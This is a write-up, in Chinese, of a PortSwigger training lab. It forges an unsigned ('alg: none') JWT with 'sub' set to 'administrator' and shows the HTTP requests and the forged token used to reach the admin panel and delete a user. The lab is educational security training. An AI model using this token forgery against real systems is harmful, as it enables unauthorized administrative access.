# 实验：通过未验证签名绕过 JWT 认证

本实验使用基于 JWT 的机制来处理会话。由于实现缺陷，服务器不会验证其收到的任何 JWT 的签名。

为了解决本实验，请修改你的会话令牌以访问位于 `/admin` 的管理员面板，然后删除用户 `carlos`。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 我们建议在尝试此实验之前熟悉[如何在 Burp Suite 中使用 JWT](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/session-management/jwts)。

    - 会话 cookie 为 jwt 格式

- 尝试访问管理员端点
    ```http
    GET /admin HTTP/2
    ```
    - 服务器响应 401 未验证
        ```log
        Admin interface only available if logged in as an administrator
        ```

尝试篡改 JWT
- 安装 JWT 编辑器扩展后，发送到重复器，在请求界面的 JWT 标签对 JWT 进行编辑
    ```json
    {
        "iss": "portswigger",
        "exp": 1786704504,
        "sub": "wiener"
    }
    ```
- 修改 `sub` 字段为管理员 `administrator`，使用 `none` 签名
    ```json
    {
        "iss": "portswigger",
        "exp": 1786704504,
        "sub": "administrator"
    }
    ```
    - 得到
        ```jwt
        eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjcwNDUwNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
        ```

- 移除账户端点的请求参数用户名后，访问账户页面
    ```http
    GET /my-account HTTP/2
    Host: 0ade00b404bdc0a5805e2b4000e80088.web-security-academy.net
    Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjcwNDUwNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
    ```

- 成功作为管理员登录
- 访问管理端点并删除目标用户
